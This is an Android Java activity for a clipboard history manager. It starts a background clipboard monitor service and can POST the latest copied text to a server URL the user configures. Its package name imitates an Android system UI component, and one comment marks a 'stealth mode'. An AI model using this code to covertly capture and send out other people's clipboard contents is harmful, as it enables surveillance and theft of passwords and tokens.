package com.android.systemui.helper;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import androidx.recyclerview.widget.RecyclerView;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.ItemTouchHelper;
import androidx.recyclerview.widget.DividerItemDecoration;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.Drawable;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.EditText;
import android.app.AlertDialog;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class ClipboardManagerActivity extends Activity {
    private RecyclerView clipboardRecyclerView;
    private ClipboardAdapter adapter;
    private List<ClipboardItem> clipboardHistory;
    private SharedPreferences prefs;
    private Gson gson;
    private static final String PREFS_NAME = "clipboard_prefs";
    private static final String HISTORY_KEY = "clipboard_history";
    private SimpleDateFormat dateFormat;
    private SimpleDateFormat timeFormat;
    private TextView itemCountText;
    
    private BroadcastReceiver clipboardUpdateReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("ClipboardManager", "BroadcastReceiver onReceive called - CLIPBOARD_UPDATE");
            // Add small delay to ensure SharedPreferences are synced
            clipboardRecyclerView.postDelayed(() -> {
                Log.d("ClipboardManager", "Refreshing UI after delay");
                loadClipboardHistory();
                displayClipboardHistory();
            }, 100);
        }
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_clipboard_manager);
        
        // Hide action bar
        if (getActionBar() != null) {
            getActionBar().hide();
        }
        
        gson = new Gson();
        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        dateFormat = new SimpleDateFormat("MMM dd, yyyy", Locale.getDefault());
        timeFormat = new SimpleDateFormat("hh:mm:ss a", Locale.getDefault());
        
        clipboardRecyclerView = findViewById(R.id.clipboard_recycler_view);
        itemCountText = findViewById(R.id.item_count);
        ImageView backButton = findViewById(R.id.back_button);
        View androidWarning = findViewById(R.id.android_warning);
        View captureButton = findViewById(R.id.capture_now_button);
        View sendToServerButton = findViewById(R.id.send_to_server_button);
        TextView serverUrlText = findViewById(R.id.server_url_text);
        TextView emptyStateText = findViewById(R.id.empty_state_text);
        
        // Load server URL from SharedPreferences
        String serverUrl = prefs.getString("server_url", "");
        if (!serverUrl.isEmpty()) {
            serverUrlText.setText(serverUrl);
        }
        
        // Setup RecyclerView
        clipboardRecyclerView.setLayoutManager(new LinearLayoutManager(this));
        adapter = new ClipboardAdapter(this, clipboardHistory);
        
        // Set adapter listener for copy and long click actions
        adapter.setOnItemClickListener(new ClipboardAdapter.OnItemClickListener() {
            @Override
            public void onItemCopied(ClipboardItem item) {
                // Move item to top when copied
                clipboardHistory.remove(item);
                item.timestamp = System.currentTimeMillis();
                clipboardHistory.add(0, item);
                saveClipboardHistory();
                displayClipboardHistory();
            }
            
            @Override
            public void onItemLongClick(ClipboardItem item) {
                showFullContent(item.content);
            }
        });
        
        clipboardRecyclerView.setAdapter(adapter);
        
        // Setup swipe to delete
        setupSwipeToDelete();
        
        backButton.setOnClickListener(v -> finish());
        
        // Show warning on Android 10+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            androidWarning.setVisibility(View.VISIBLE);
        }
        
        // Manual capture button
        if (captureButton != null) {
            captureButton.setOnClickListener(v -> captureCurrentClipboard());
        }
        
        // Send to server button
        if (sendToServerButton != null) {
            sendToServerButton.setOnClickListener(v -> sendLatestClipboardToServer());
            
            // Long press to configure
            sendToServerButton.setOnLongClickListener(v -> {
                showServerSettingsDialog();
                return true;
            });
        }
        
        loadClipboardHistory();
        displayClipboardHistory();
        
        // Start the clipboard monitoring service if not already running
        Intent serviceIntent = new Intent(this, ClipboardMonitorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Register broadcast receiver for clipboard updates
        IntentFilter filter = new IntentFilter("com.android.systemui.helper.CLIPBOARD_UPDATE");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(clipboardUpdateReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(clipboardUpdateReceiver, filter);
        }
        Log.d("ClipboardManager", "Registered broadcast receiver for CLIPBOARD_UPDATE");
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        // Reload history when activity resumes
        loadClipboardHistory();
        displayClipboardHistory();
    }
    
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent); // Important: update the intent
        // Handle refresh intent from broadcast receiver
        if (intent != null && intent.getBooleanExtra("refresh", false)) {
            Log.d("ClipboardManager", "Received refresh intent from broadcast");
            runOnUiThread(() -> {
                loadClipboardHistory();
                displayClipboardHistory();
            });
            // Stealth mode - no toast
            // Toast.makeText(this, "Clipboard refreshed", Toast.LENGTH_SHORT).show();
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Unregister broadcast receiver
        try {
            unregisterReceiver(clipboardUpdateReceiver);
        } catch (Exception e) {
            // Ignore if not registered
        }
    }
    
    private void loadClipboardHistory() {
        String historyJson = prefs.getString(HISTORY_KEY, "[]");
        clipboardHistory = gson.fromJson(historyJson, new TypeToken<List<ClipboardItem>>(){}.getType());
        if (clipboardHistory == null) {
            clipboardHistory = new ArrayList<>();
        }
    }
    
    private void saveClipboardHistory() {
        String historyJson = gson.toJson(clipboardHistory);
        prefs.edit().putString(HISTORY_KEY, historyJson).apply();
    }
    
    private void displayClipboardHistory() {
        Log.d("ClipboardManager", "displayClipboardHistory called with " + clipboardHistory.size() + " items");
        // Update item count
        if (itemCountText != null) {
            itemCountText.setText(clipboardHistory.size() + " items");
        }
        
        TextView emptyStateText = findViewById(R.id.empty_state_text);
        
        if (clipboardHistory.isEmpty()) {
            // Show empty state
            clipboardRecyclerView.setVisibility(View.GONE);
            if (emptyStateText != null) {
                emptyStateText.setVisibility(View.VISIBLE);
            }
        } else {
            // Show list
            clipboardRecyclerView.setVisibility(View.VISIBLE);
            if (emptyStateText != null) {
                emptyStateText.setVisibility(View.GONE);
            }
            
            // Force complete adapter recreation to ensure UI updates
            adapter = new ClipboardAdapter(this, new ArrayList<>(clipboardHistory));
            
            // Set adapter listener for copy and long click actions
            adapter.setOnItemClickListener(new ClipboardAdapter.OnItemClickListener() {
                @Override
                public void onItemCopied(ClipboardItem item) {
                    // Move item to top when copied
                    clipboardHistory.remove(item);
                    item.timestamp = System.currentTimeMillis();
                    clipboardHistory.add(0, item);
                    saveClipboardHistory();
                    displayClipboardHistory();
                }
                
                @Override
                public void onItemLongClick(ClipboardItem item) {
                    showFullContent(item.content);
                }
            });
            
            clipboardRecyclerView.setAdapter(adapter);
            Log.d("ClipboardManager", "Recreated adapter with " + clipboardHistory.size() + " items");
        }
    }
    
    private void setupSwipeToDelete() {
        ItemTouchHelper.SimpleCallback simpleCallback = new ItemTouchHelper.SimpleCallback(0, ItemTouchHelper.LEFT) {
            private final Paint backgroundPaint = new Paint();
            private final Paint textPaint = new Paint();
            private final Paint iconPaint = new Paint();
            
            {
                // Initialize paints
                backgroundPaint.setColor(Color.parseColor("#D32F2F")); // Softer, muted red
                backgroundPaint.setAntiAlias(true);
                
                textPaint.setColor(Color.parseColor("#FFFFFF"));
                textPaint.setTextSize(28); // Smaller, more elegant size
                textPaint.setTypeface(android.graphics.Typeface.create("sans-serif", android.graphics.Typeface.NORMAL));
                textPaint.setAntiAlias(true);
                
                iconPaint.setColor(Color.parseColor("#FFFFFF"));
                iconPaint.setAntiAlias(true);
                iconPaint.setStyle(Paint.Style.STROKE);
                iconPaint.setStrokeWidth(2.5f);
            }
            
            @Override
            public boolean onMove(RecyclerView recyclerView, RecyclerView.ViewHolder viewHolder, RecyclerView.ViewHolder target) {
                return false;
            }
            
            @Override
            public void onSwiped(RecyclerView.ViewHolder viewHolder, int direction) {
                int position = viewHolder.getAdapterPosition();
                if (position >= 0 && position < clipboardHistory.size()) {
                    // Remove item from list
                    clipboardHistory.remove(position);
                    // Save updated history
                    saveClipboardHistory();
                    // Update adapter
                    adapter.notifyItemRemoved(position);
                    // Update item count
                    if (itemCountText != null) {
                        itemCountText.setText(clipboardHistory.size() + " items");
                    }
                    // Check if list is now empty
                    if (clipboardHistory.isEmpty()) {
                        displayClipboardHistory();
                    }
                    Toast.makeText(ClipboardManagerActivity.this, "Item deleted", Toast.LENGTH_SHORT).show();
                }
            }
            
            @Override
            public void onChildDraw(Canvas c, RecyclerView recyclerView, RecyclerView.ViewHolder viewHolder,
                                    float dX, float dY, int actionState, boolean isCurrentlyActive) {
                View itemView = viewHolder.itemView;
                
                if (dX < 0) { // Swiping left
                    int itemHeight = itemView.getHeight();
                    int itemTop = itemView.getTop();
                    int itemBottom = itemView.getBottom();
                    int itemRight = itemView.getRight();
                    
                    // Calculate bounds with rounded corners only on the right
                    int margin = 8; // Same as item margin
                    float left = itemRight + dX;
                    float top = itemTop + margin;
                    float right = itemRight - margin;
                    float bottom = itemBottom - margin;
                    
                    // Draw background with only right corners rounded
                    android.graphics.Path path = new android.graphics.Path();
                    float cornerRadius = 12;
                    
                    // Start from top-left (no rounding)
                    path.moveTo(left, top);
                    // Top edge to top-right corner
                    path.lineTo(right - cornerRadius, top);
                    // Top-right corner (rounded)
                    path.quadTo(right, top, right, top + cornerRadius);
                    // Right edge to bottom-right corner
                    path.lineTo(right, bottom - cornerRadius);
                    // Bottom-right corner (rounded)
                    path.quadTo(right, bottom, right - cornerRadius, bottom);
                    // Bottom edge to bottom-left (no rounding)
                    path.lineTo(left, bottom);
                    // Left edge back to top-left (no rounding)
                    path.lineTo(left, top);
                    path.close();
                    
                    c.drawPath(path, backgroundPaint);
                    
                    // Calculate alpha based on swipe distance
                    float alpha = Math.min(1f, Math.abs(dX) / (itemView.getWidth() * 0.3f));
                    textPaint.setAlpha((int)(255 * alpha));
                    iconPaint.setAlpha((int)(255 * alpha));
                    
                    // Center content in the visible delete area
                    float deleteAreaWidth = Math.abs(dX);
                    float centerX = itemRight - (deleteAreaWidth / 2);
                    
                    // Draw trash icon with better proportions
                    float iconWidth = 20;
                    float iconHeight = 24; // Better aspect ratio
                    float iconCenterY = itemTop + itemHeight / 2f - 18; // Move up more to make room for text
                    
                    // Draw trash can body (proper rectangle)
                    android.graphics.RectF trashBody = new android.graphics.RectF(
                        centerX - iconWidth/2,
                        iconCenterY - iconHeight/3,
                        centerX + iconWidth/2,
                        iconCenterY + iconHeight/3
                    );
                    iconPaint.setStyle(Paint.Style.STROKE);
                    c.drawRoundRect(trashBody, 2, 2, iconPaint);
                    
                    // Draw vertical lines inside trash can for detail
                    float lineSpacing = iconWidth / 4;
                    c.drawLine(
                        centerX - lineSpacing,
                        iconCenterY - iconHeight/4,
                        centerX - lineSpacing,
                        iconCenterY + iconHeight/4,
                        iconPaint
                    );
                    c.drawLine(
                        centerX,
                        iconCenterY - iconHeight/4,
                        centerX,
                        iconCenterY + iconHeight/4,
                        iconPaint
                    );
                    c.drawLine(
                        centerX + lineSpacing,
                        iconCenterY - iconHeight/4,
                        centerX + lineSpacing,
                        iconCenterY + iconHeight/4,
                        iconPaint
                    );
                    
                    // Draw trash can lid (wider than body)
                    float lidWidth = iconWidth * 1.3f;
                    c.drawLine(
                        centerX - lidWidth/2,
                        iconCenterY - iconHeight/3,
                        centerX + lidWidth/2,
                        iconCenterY - iconHeight/3,
                        iconPaint
                    );
                    
                    // Draw lid top (thicker line)
                    iconPaint.setStrokeWidth(3.5f);
                    c.drawLine(
                        centerX - lidWidth/2,
                        iconCenterY - iconHeight/2.5f,
                        centerX + lidWidth/2,
                        iconCenterY - iconHeight/2.5f,
                        iconPaint
                    );
                    iconPaint.setStrokeWidth(2.5f); // Reset stroke width
                    
                    // Draw handle on lid
                    android.graphics.RectF handle = new android.graphics.RectF(
                        centerX - iconWidth/5,
                        iconCenterY - iconHeight/1.8f,
                        centerX + iconWidth/5,
                        iconCenterY - iconHeight/2.5f
                    );
                    iconPaint.setStyle(Paint.Style.STROKE);
                    c.drawArc(handle, 180, 180, false, iconPaint);
                    
                    // Draw delete text below icon with proper spacing
                    String deleteText = "Delete";
                    float textWidth = textPaint.measureText(deleteText);
                    float textX = centerX - textWidth / 2;
                    float textY = iconCenterY + iconHeight/3 + 30; // Much more spacing from icon
                    
                    // Only draw text if there's enough space
                    if (deleteAreaWidth > 60) {
                        c.drawText(deleteText, textX, textY, textPaint);
                    }
                }
                
                super.onChildDraw(c, recyclerView, viewHolder, dX, dY, actionState, isCurrentlyActive);
            }
        };
        
        ItemTouchHelper itemTouchHelper = new ItemTouchHelper(simpleCallback);
        itemTouchHelper.attachToRecyclerView(clipboardRecyclerView);
    }
    
    private void copyToClipboard(String text) {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("Clipboard Manager", text);
        clipboard.setPrimaryClip(clip);
    }
    
    private void captureCurrentClipboard() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            
            // First try normal clipboard access
            ClipData clipData = null;
            if (clipboard.hasPrimaryClip()) {
                clipData = clipboard.getPrimaryClip();
                if (clipData == null || clipData.getItemCount() == 0) {
                    // No clipboard data available
                    Toast.makeText(this, "Clipboard is empty or restricted", Toast.LENGTH_SHORT).show();
                    return;
                }
            } else {
                // No clipboard data available
                Toast.makeText(this, "Clipboard is empty or restricted", Toast.LENGTH_SHORT).show();
                return;
            }
            
            ClipData.Item item = clipData.getItemAt(0);
            CharSequence text = item.getText();
            
            if (text == null || text.length() == 0) {
                Toast.makeText(this, "Clipboard contains non-text data", Toast.LENGTH_SHORT).show();
                return;
            }
            
            String clipboardText = text.toString();
            
            // Check if already exists
            for (ClipboardItem historyItem : clipboardHistory) {
                if (historyItem.content.equals(clipboardText)) {
                    // Move to top
                    clipboardHistory.remove(historyItem);
                    historyItem.timestamp = System.currentTimeMillis();
                    clipboardHistory.add(0, historyItem);
                    saveClipboardHistory();
                    displayClipboardHistory();
                    Toast.makeText(this, "Clipboard updated", Toast.LENGTH_SHORT).show();
                    return;
                }
            }
            
            // Add new item
            ClipboardItem newItem = new ClipboardItem(
                clipboardText,
                System.currentTimeMillis(),
                "Manual Capture"
            );
            clipboardHistory.add(0, newItem);
            
            // Limit size
            while (clipboardHistory.size() > 100) {
                clipboardHistory.remove(clipboardHistory.size() - 1);
            }
            
            saveClipboardHistory();
            displayClipboardHistory();
            Toast.makeText(this, "Clipboard captured", Toast.LENGTH_SHORT).show();
            
        } catch (Exception e) {
            Toast.makeText(this, "Failed to capture clipboard: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
    
    private void showFullContent(String content) {
        // Could show a dialog with full content, for now just show a longer toast
        Toast.makeText(this, content, Toast.LENGTH_LONG).show();
    }
    
    private void sendLatestClipboardToServer() {
        if (clipboardHistory.isEmpty()) {
            Toast.makeText(this, "No clipboard content to send", Toast.LENGTH_SHORT).show();
            return;
        }
        
        String serverUrl = prefs.getString("server_url", "");
        if (serverUrl.isEmpty()) {
            Toast.makeText(this, "Server not configured. Long press to set URL.", Toast.LENGTH_LONG).show();
            return;
        }
        
        // Get the latest clipboard item
        ClipboardItem latestItem = clipboardHistory.get(0);
        String content = latestItem.content;
        
        // Send HTTP request in background
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(serverUrl);
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                // Create JSON payload
                String jsonPayload = "{\"content\":\"" + content.replace("\"", "\\\"").replace("\n", "\\n") + 
                                    "\",\"timestamp\":" + latestItem.timestamp + 
                                    ",\"source\":\"" + latestItem.sourceApp + "\"}";
                
                java.io.OutputStream os = conn.getOutputStream();
                os.write(jsonPayload.getBytes("UTF-8"));
                os.flush();
                os.close();
                
                int responseCode = conn.getResponseCode();
                
                runOnUiThread(() -> {
                    if (responseCode >= 200 && responseCode < 300) {
                        Toast.makeText(this, "Sent to server successfully", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(this, "Server returned: " + responseCode, Toast.LENGTH_SHORT).show();
                    }
                });
                
            } catch (Exception e) {
                runOnUiThread(() -> {
                    Toast.makeText(this, "Failed to send: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                });
            }
        }).start();
    }
    
    private void showServerSettingsDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Server Configuration");
        
        // Create input field
        final EditText input = new EditText(this);
        input.setHint("https://example.com/api/clipboard");
        input.setText(prefs.getString("server_url", ""));
        builder.setView(input);
        
        // Set buttons
        builder.setPositiveButton("Save", (dialog, which) -> {
            String serverUrl = input.getText().toString().trim();
            if (!serverUrl.isEmpty()) {
                // Save to SharedPreferences
                prefs.edit().putString("server_url", serverUrl).apply();
                
                // Update UI
                TextView serverUrlText = findViewById(R.id.server_url_text);
                serverUrlText.setText(serverUrl);
                
                Toast.makeText(this, "Server URL saved", Toast.LENGTH_SHORT).show();
            }
        });
        
        builder.setNegativeButton("Cancel", (dialog, which) -> dialog.cancel());
        
        builder.setNeutralButton("Test", (dialog, which) -> {
            String serverUrl = input.getText().toString().trim();
            if (!serverUrl.isEmpty()) {
                testServerConnection(serverUrl);
            }
        });
        
        builder.show();
    }
    
    private void testServerConnection(String serverUrl) {
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(serverUrl);
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                
                int responseCode = conn.getResponseCode();
                
                runOnUiThread(() -> {
                    if (responseCode >= 200 && responseCode < 300) {
                        Toast.makeText(this, "Server is reachable (" + responseCode + ")", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(this, "Server returned: " + responseCode, Toast.LENGTH_SHORT).show();
                    }
                });
                
            } catch (Exception e) {
                runOnUiThread(() -> {
                    Toast.makeText(this, "Connection failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                });
            }
        }).start();
    }
    
    public static class ClipboardItem {
        public String content;
        public long timestamp;
        public String sourceApp;
        
        public ClipboardItem(String content, long timestamp, String sourceApp) {
            this.content = content;
            this.timestamp = timestamp;
            this.sourceApp = sourceApp;
        }
        
        @Override
        public boolean equals(Object obj) {
            if (obj instanceof ClipboardItem) {
                return ((ClipboardItem) obj).content.equals(this.content);
            }
            return false;
        }
    }
}
